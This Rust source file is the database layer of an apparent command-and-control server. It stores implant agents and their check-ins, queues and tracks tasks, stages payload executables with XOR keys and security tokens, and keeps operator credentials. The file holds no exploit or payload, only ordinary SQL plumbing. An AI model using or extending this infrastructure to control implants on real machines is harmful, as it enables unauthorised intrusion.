//! All database related functions

use std::{
    collections::{HashMap, HashSet},
    env,
};

use chrono::{DateTime, Utc};
use shared::{
    pretty_print::{print_failed, print_info, print_success},
    tasks::{Command, FirstRunData, NewAgentStaging, Task},
};
use shared_c2_client::{NotificationForAgent, NotificationsForAgents, StagedResourceData};
use sqlx::{Pool, Postgres, Row, migrate::Migrator, postgres::PgPoolOptions};

use crate::{agents::Agent, app_state::DownloadEndpointData, logging::log_error_async};

const MAX_DB_CONNECTIONS: u32 = 5;
static MIGRATOR: Migrator = sqlx::migrate!("./migrations");

pub struct Db {
    pool: Pool<Postgres>,
}

impl Db {
    /// Establish the connection to the Postgres db
    pub async fn new() -> Self {
        let db_string = format!(
            "postgres://{}:{}@{}/{}",
            env::var("POSTGRES_USER").expect("could not find POSTGRES_USER"),
            env::var("POSTGRES_PASSWORD").expect("could not find POSTGRES_PASSWORD"),
            env::var("POSTGRES_HOST").expect("could not find POSTGRES_HOST"),
            env::var("POSTGRES_DB").expect("could not find POSTGRES_DB")
        );

        print_info(format!("Connecting to database..."));

        let pool = PgPoolOptions::new()
            .max_connections(MAX_DB_CONNECTIONS)
            .connect(&db_string)
            .await
            .map_err(|e| {
                print_failed(format!("Could not establish a database connection. {e}"));
                panic!();
            })
            .unwrap();

        if let Err(e) = MIGRATOR.run(&pool).await {
            print_failed(format!("Could not run db migrations. {e}"));
            panic!()
        }

        print_success("Db connection established");

        Self { pool }
    }

    // ************* DATABASE QUERIES

    /// Get an `Agent` from the db by its id and retrieves any tasks that are pending for
    /// the agent.
    pub async fn get_agent_with_tasks_by_id(
        &self,
        id: &str,
        frd: FirstRunData,
    ) -> Result<(Agent, Option<Vec<Task>>), sqlx::Error> {
        // Get the agent
        let row = sqlx::query(
            r#"
            SELECT uid, sleep
            FROM agents
            WHERE uid = $1"#,
        )
        .bind(id)
        .fetch_one(&self.pool)
        .await?;

        let sleep: i64 = row.try_get("sleep")?;
        let sleep = sleep as u64;

        // Strictly speaking this isn't coming from the DB, but the time will close enough within
        // a reasonable degree of error.
        let last_check_in: DateTime<Utc> = Utc::now();

        // Get any tasks
        let tasks = self.get_tasks_for_agent_by_uid(id).await?;

        Ok((
            Agent {
                uid: id.to_string(),
                sleep,
                first_run_data: frd,
                last_checkin_time: last_check_in,
                is_stale: false,
            },
            tasks,
        ))
    }

    pub async fn get_tasks_for_agent_by_uid(
        &self,
        uid: &str,
    ) -> Result<Option<Vec<Task>>, sqlx::Error> {
        let rows = sqlx::query(
            r#"
            SELECT id, command_id, data
            FROM tasks
            WHERE agent_id=$1
                AND fetched = FALSE
            ORDER BY id ASC
            "#,
        )
        .bind(uid)
        .fetch_all(&self.pool)
        .await?;

        if rows.is_empty() {
            return Ok(None);
        }

        let mut tasks: Vec<Task> = Vec::new();

        for row in rows {
            let task_id: i32 = row.try_get("id")?;
            let command_id: i32 = row.try_get("command_id")?;
            let metadata: Option<String> = row.try_get("data")?;

            let command = Command::from_u32(command_id as _);

            let task = Task::from(task_id, command, metadata);

            // As we are pulling tasks from the db to send back to the client; we want to make sure
            // at this point we mark any tasks as complete which are auto-completable that don't require
            // a response posted back to us
            if command.is_autocomplete() {
                self.mark_task_completed(&task)
                    .await
                    .expect("Could not complete task");
                self.add_completed_task(&task, uid)
                    .await
                    .expect("Could not add task to completed");
            }

            //
            // Mark the task as fetched - so we don't double poll
            //
            if let Err(e) = self.mark_task_fetched(&task).await {
                log_error_async(&format!(
                    "Could not mark task ID {} as fetched. {e}",
                    task.id
                ))
                .await;
            };

            tasks.push(task);
        }

        Ok(Some(tasks))
    }

    pub async fn insert_new_agent(
        &self,
        id: &str,
        frd: FirstRunData,
    ) -> Result<Agent, sqlx::Error> {
        let _ = sqlx::query(
            "INSERT into agents (uid, sleep)
            VALUES ($1, $2)",
        )
        .bind(id)
        .bind(frd.e as i64)
        .execute(&self.pool)
        .await?;

        let last_checkin_time: DateTime<Utc> = Utc::now();

        Ok({
            Agent {
                uid: id.to_string(),
                sleep: frd.e,
                first_run_data: frd,
                last_checkin_time,
                is_stale: false,
            }
        })
    }

    pub async fn add_task_for_agent_by_id(
        &self,
        uid: &String,
        command: Command,
        metadata: Option<String>,
    ) -> Result<(), sqlx::Error> {
        let _ = sqlx::query(
            r#"
            INSERT into tasks (command_id, data, agent_id, fetched)
            VALUES ($1, $2, $3, FALSE)"#,
        )
        .bind(command as i32)
        .bind(metadata)
        .bind(uid)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    pub async fn update_agent_sleep_time(
        &self,
        uid: &String,
        metadata: i64,
    ) -> Result<(), sqlx::Error> {
        let _ = sqlx::query(
            "UPDATE agents
            SET sleep = $1
            WHERE uid = $2",
        )
        .bind(metadata)
        .bind(uid)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Sets a task to completed in the db
    pub async fn mark_task_completed(&self, task: &Task) -> Result<(), sqlx::Error> {
        let _ = sqlx::query(
            r#"
            UPDATE tasks
            SET completed = TRUE
            WHERE id = $1
        "#,
        )
        .bind(task.id)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Marks a task as fetched in the db
    pub async fn mark_task_fetched(&self, task: &Task) -> Result<(), sqlx::Error> {
        let _ = sqlx::query(
            r#"
            UPDATE tasks
            SET fetched = TRUE
            WHERE id = $1
        "#,
        )
        .bind(task.id)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Adds a completed task into the `completed_tasks` table which stores the results
    /// and metadata associated with completed task results, to be used by the client.
    pub async fn add_completed_task(&self, task: &Task, agent_id: &str) -> Result<(), sqlx::Error> {
        let cmd_id: u32 = task.command.into();

        let _ = sqlx::query(
            r#"
            INSERT INTO completed_tasks (task_id, result, time_completed_ms, agent_id, command_id)
            VALUES ($1, $2, $3, $4, $5)
        "#,
        )
        .bind(task.id)
        .bind(task.metadata.as_deref())
        .bind(task.completed_time)
        .bind(agent_id)
        .bind(cmd_id as i32)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Db query that looks whether an agent by its UID has any pending notifications
    /// that have not been polled by the client.
    pub async fn agent_has_pending_notifications(&self, uid: &String) -> Result<bool, sqlx::Error> {
        let results = sqlx::query(
            r#"
            SELECT ct.id
            FROM completed_tasks ct
            JOIN tasks t
                ON ct.task_id = t.id
            WHERE
                t.agent_id = $1
                AND ct.client_pulled_update = FALSE
        "#,
        )
        .bind(uid)
        .fetch_one(&self.pool)
        .await;

        let results = match results {
            Ok(r) => r,
            Err(e) => match e {
                sqlx::Error::RowNotFound => return Ok(false),
                _ => return Ok(false),
            },
        };

        Ok(!results.is_empty())
    }

    pub async fn pull_notifications_for_agent(
        &self,
        uid: &String,
    ) -> Result<Option<NotificationsForAgents>, sqlx::Error> {
        let rows: NotificationsForAgents = sqlx::query_as(
            r#"
            SELECT
                ct.id AS completed_id,
                ct.task_id,
                t.command_id,
                t.agent_id,
                ct.result,
                ct.time_completed_ms
            FROM completed_tasks ct
            JOIN tasks t
                ON ct.task_id = t.id
            WHERE
                ct.client_pulled_update = FALSE
                AND t.agent_id = $1
            ORDER BY ct.task_id ASC
        "#,
        )
        .bind(uid)
        .fetch_all(&self.pool)
        .await?;

        if rows.is_empty() {
            return Ok(None);
        }

        Ok(Some(rows))
    }

    pub async fn mark_agent_notification_completed(
        &self,
        completed_ids: &[i32],
    ) -> Result<(), sqlx::Error> {
        let _ = sqlx::query(
            r#"
            UPDATE completed_tasks
            SET client_pulled_update = TRUE
            WHERE id = ANY($1::int4[])
            "#,
        )
        .bind(completed_ids)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Updates the agents last check-in time, both in the database, and the in memory copy of the agent.
    pub async fn update_agent_checkin_time(&self, agent: &mut Agent) -> Result<(), sqlx::Error> {
        // Update the in memory representation of the agent's last check-in
        agent.last_checkin_time = Utc::now();

        // We will use PG inbuilt now() function to keep types happy
        let _ = sqlx::query(
            r#"
            UPDATE agents
            SET last_check_in = now()
            WHERE uid = $1
            "#,
        )
        .bind(&agent.uid)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    // pub async fn get_agent_last_check_in(&self, uid: &str) -> Result<DateTime<Utc>, sqlx::Error> {
    //     let row = sqlx::query(
    //         r#"
    //         SELECT last_check_in
    //         FROM agents
    //         WHERE uid = $1
    //         "#,
    //     )
    //     .bind(uid)
    //     .fetch_one(&self.pool)
    //     .await?;

    //     let last_check_in: DateTime<Utc> = row.try_get("last_check_in")?;

    //     Ok(last_check_in)
    // }

    pub async fn add_staged_agent(&self, data: &NewAgentStaging) -> Result<(), sqlx::Error> {
        // As we are using this as a u8, and we cannot store it in the db as a u8 for some reason (?)
        // we will cast it to an i16 for storage, so we can safely convert back to a u8 without causing
        // undefined behaviour with an int overflow.

        let _ = sqlx::query(
            "INSERT into agent_staging 
                (agent_name, host, c2_endpoint, staged_endpoint, sleep_time, pe_name, port, security_token)
            VALUES 
                ($1, $2, $3, $4, $5, $6, $7, $8)
            ",
        )
        .bind(&data.implant_name)
        .bind(&data.c2_address)
        .bind(&data.c2_endpoints[0])
        .bind(&data.staging_endpoint)
        .bind(data.default_sleep_time)
        .bind(&data.pe_name)
        .bind(data.port as i16)
        .bind(&data.agent_security_token)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    /// Deletes the database row relating to a staged resource.
    ///
    /// # Returns
    /// A `string` containing the file name on the local disk of the server.
    pub async fn delete_staged_resource_by_uri(
        &self,
        download_url: &str,
    ) -> Result<String, sqlx::Error> {
        // Get the file name on disk before we delete, which will allow the file to be deleted by
        // path
        let results = sqlx::query(
            "SELECT pe_name FROM agent_staging 
            WHERE staged_endpoint = $1",
        )
        .bind(download_url)
        .fetch_one(&self.pool)
        .await?;

        let file_name: String = results.get("pe_name");

        // Remove the agent staging row
        let _ = sqlx::query(
            "DELETE FROM agent_staging 
            WHERE staged_endpoint = $1",
        )
        .bind(download_url)
        .execute(&self.pool)
        .await?;

        Ok(file_name)
    }

    /// Queries the database to get URI information around routes available for agents where
    /// the operator has configured the C2 to use them, as well as staged downloads.
    ///
    /// # Returns
    /// On success returns a tuple:
    ///
    /// - `HashSet<String>` containing the URIs that are permitted for c2 check-in
    /// - `HashMap<String, String>` containing the URI's (key) and PE names (value) for staged downloads
    /// - `HashSet<String>` containing the security tokens valid for agents to connect to the C2
    pub async fn get_agent_related_db_cfg(
        &self,
    ) -> Result<
        (
            HashSet<String>,
            HashMap<String, DownloadEndpointData>,
            HashSet<String>,
        ),
        sqlx::Error,
    > {
        let mut check_in_uris: HashSet<String> = HashSet::new();
        let mut security_tokens: HashSet<String> = HashSet::new();
        let mut staged_downloads: HashMap<String, DownloadEndpointData> = HashMap::new();

        let rows = sqlx::query(
            r#"
            SELECT c2_endpoint, staged_endpoint, pe_name, security_token, agent_name, xor_key
            FROM agent_staging"#,
        )
        .fetch_all(&self.pool)
        .await?;

        if rows.is_empty() {
            return Ok((check_in_uris, staged_downloads, security_tokens));
        }

        for row in rows {
            let c2_endpoint: String = row.try_get("c2_endpoint")?;
            let staged_endpoint: String = row.try_get("staged_endpoint")?;
            let pe_name: String = row.try_get("pe_name")?;
            let agent_security_token: String = row.try_get("security_token")?;
            let agent_name: String = row.try_get("agent_name")?;
            let xor_key: Option<u8> = {
                let k: i16 = row.try_get("xor_key")?;
                // Cast is safe - we only ever accept a u8 on the frontend so we wont
                // experience any undefined behaviour in respect of integer underflow.
                if k == 0 { None } else { Some(k as u8) }
            };

            check_in_uris.insert(c2_endpoint);
            staged_downloads.insert(
                staged_endpoint,
                DownloadEndpointData::new(&pe_name, &agent_name, xor_key),
            );
            security_tokens.insert(agent_security_token);
        }

        Ok((check_in_uris, staged_downloads, security_tokens))
    }

    /// Attempts to lookup an operator - at the moment this only supports SINGLE OPERATOR operations
    /// so when we make the lookup, we are looking for 1 and only 1 row. We are NOT searching by username
    /// right now.
    ///
    /// # Returns
    /// Some - (`db_username`, `password_hash`, `salt`) of the row
    /// None - if the operator could not be found
    pub async fn lookup_operator(
        &self,
        _username: &str,
    ) -> Result<Option<(String, String, String)>, sqlx::Error> {
        let row = sqlx::query(
            r#"
            SELECT username, password_hash, salt
            FROM operators"#,
        )
        .fetch_one(&self.pool)
        .await?;

        if row.is_empty() {
            return Ok(None);
        }

        let db_username: String = row.try_get("username")?;
        let password_hash: String = row.try_get("password_hash")?;
        let salt: String = row.try_get("salt")?;

        Ok(Some((db_username, password_hash, salt)))
    }

    pub async fn add_operator(
        &self,
        username: &str,
        pw_hash: &str,
        salt_hash: &str,
    ) -> Result<(), sqlx::Error> {
        if let Ok(result) = self.lookup_operator("").await
            && result.is_some()
        {
            panic!("You are trying to add another operator and that is forbidden right now.");
        }

        let _ = sqlx::query(
            "INSERT into operators 
                (username, password_hash, salt)
            VALUES 
                ($1, $2, $3)
            ",
        )
        .bind(username)
        .bind(pw_hash)
        .bind(salt_hash)
        .execute(&self.pool)
        .await?;

        Ok(())
    }

    pub async fn get_staged_agent_data(&self) -> Result<Vec<StagedResourceData>, sqlx::Error> {
        let rows = sqlx::query_as::<_, StagedResourceData>(
            r#"
            SELECT agent_name, c2_endpoint, staged_endpoint, pe_name, sleep_time, port
            FROM agent_staging"#,
        )
        .fetch_all(&self.pool)
        .await?;

        Ok(rows)
    }

    pub async fn get_agent_export_data(&self, uid: &str) -> Result<Option<Vec<Task>>, sqlx::Error> {
        let rows = sqlx::query(
            r#"
            SELECT task_id, result, time_completed_ms, command_id
            FROM completed_tasks
            WHERE agent_id = $1"#,
        )
        .bind(uid)
        .fetch_all(&self.pool)
        .await?;

        if rows.is_empty() {
            return Ok(None);
        }

        let mut results = vec![];

        for row in rows {
            let task_id: i32 = row.try_get("task_id")?;
            let metadata: Option<String> = row.try_get("result")?;
            let completed_time: i64 = row.try_get("time_completed_ms")?;
            let command_id: i32 = row.try_get("command_id")?;

            let command = Command::from_u32(command_id as _);

            results.push(Task {
                id: task_id,
                command,
                completed_time,
                metadata,
            });
        }

        Ok(Some(results))
    }
}
